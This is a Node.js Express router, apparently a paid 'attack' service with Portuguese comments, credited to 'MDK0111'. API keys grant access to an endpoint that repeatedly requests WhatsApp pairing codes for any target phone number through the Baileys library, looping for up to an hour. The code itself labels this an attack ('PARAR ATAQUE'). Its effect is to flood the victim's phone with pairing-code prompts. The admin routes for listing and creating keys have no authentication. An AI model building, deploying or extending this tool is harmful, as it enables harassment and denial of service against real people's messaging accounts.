const express = require('express')
const router = express.Router()
const pino = require('pino')
const fs = require('fs')
const path = require('path')

const DB_PATH = path.join(__dirname, 'database.json')
const PAIRINGS_DIR = path.join(__dirname, 'Pairings')

if (!fs.existsSync(DB_PATH)) fs.writeFileSync(DB_PATH, JSON.stringify({}))
if (!fs.existsSync(PAIRINGS_DIR)) fs.mkdirSync(PAIRINGS_DIR)

const processosAtivos = new Map()

const getDB = () => JSON.parse(fs.readFileSync(DB_PATH, 'utf-8'))
const saveDB = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2))

// VALIDADOR DE API KEY
const validarAcesso = (req, res, next) => {

  const apikey = req.query.apikey || req.body.apikey
  const db = getDB()

  if (!apikey || !db[apikey]) {
    return res.status(401).json({
      creator: "MDK0111",
      status: false,
      msg: "ApiKey inválida ou ausente."
    })
  }

  const user = db[apikey]

  if (user.requests !== null && user.requests <= 0) {
    return res.status(403).json({
      creator: "MDK0111",
      status: false,
      msg: "Seus requests acabaram!"
    })
  }

  if (user.requests !== null) {
    user.requests -= 1
    saveDB(db)
  }

  next()
}


// ADMIN
router.get('/admin/keys', (req, res) => {
  res.json(getDB())
})

router.post('/admin/gerar-key', (req, res) => {

  const { novaKey, limite } = req.body

  if (!novaKey) {
    return res.status(400).json({
      status: false,
      msg: "Chave vazia."
    })
  }

  const db = getDB()

  db[novaKey] = {
    requests: (limite === "infinito" || !limite) ? null : parseInt(limite),
    data: new Date().toLocaleString()
  }

  saveDB(db)

  res.json({
    status: true,
    key: novaKey
  })

})

router.delete('/admin/deletar-key/:key', (req, res) => {

  const db = getDB()

  delete db[req.params.key]

  saveDB(db)

  res.json({
    status: true
  })

})


// INICIAR PAIRING
router.get('/send-pairing=:numero', validarAcesso, async (req, res) => {

  const baileys = await import("@whiskeysockets/baileys")
  const makeWASocket = baileys.default
  const { useMultiFileAuthState, delay } = baileys

  let targetNum = req.params.numero.replace(/\D/g, '')

  if (!targetNum || targetNum.length < 8) {
    return res.status(400).json({
      creator: "MDK0111",
      error: "Número inválido."
    })
  }

  if (processosAtivos.has(targetNum)) {
    return res.json({
      creator: "MDK0111",
      status: "Aviso",
      msg: "Este número já está em processo."
    })
  }

  processosAtivos.set(targetNum, true)

  console.log(`🚀 Iniciado para ${targetNum}`)

  setTimeout(() => {

    if (processosAtivos.has(targetNum)) {

      processosAtivos.set(targetNum, false)

      console.log(`⏰ Tempo limite atingido ${targetNum}`)

    }

  }, 3600000)


  const executar = async (target) => {

    const sessionPath = path.join(PAIRINGS_DIR, `sess_${target}_${Date.now()}`)

    try {

      while (processosAtivos.get(target) === true) {

        const { state } = await useMultiFileAuthState(sessionPath)

        const sock = makeWASocket({
          auth: state,
          logger: pino({ level: "silent" }),
          printQRInTerminal: false
        })

        try {

          await delay(3000)

          const code = await sock.requestPairingCode(target)

          console.log(`🔑 Código ${target}: ${code}`)

        } catch (err) {

          console.log(`Erro envio ${target}`)

        }

        await delay(5000)

        if (fs.existsSync(sessionPath)) {
          fs.rmSync(sessionPath, { recursive: true, force: true })
        }

      }

    } catch (err) {

      console.log("Erro crítico:", err.message)

    } finally {

      processosAtivos.delete(target)

      if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true })
      }

      console.log(`🏁 Finalizado ${target}`)

    }

  }

  executar(targetNum)

  res.json({
    creator: "MDK0111",
    status: "Processo iniciado",
    numero: targetNum,
    expira: "1 hora"
  })

})


// PARAR ATAQUE
router.get('/stop-pairing=:numero', validarAcesso, (req, res) => {

  const targetNum = req.params.numero.replace(/\D/g, '')

  if (processosAtivos.has(targetNum)) {

    processosAtivos.set(targetNum, false)

    res.json({
      creator: "MDK0111",
      status: true,
      msg: `Parado para ${targetNum}`
    })

  } else {

    res.status(404).json({
      creator: "MDK0111",
      status: false,
      msg: "Número não está em execução."
    })

  }

})


// PARAR TODOS
router.get('/stop-all', validarAcesso, (req, res) => {

  for (const key of processosAtivos.keys()) {
    processosAtivos.set(key, false)
  }

  res.json({
    creator: "MDK0111",
    status: "Todos processos encerrados"
  })

})

module.exports = router
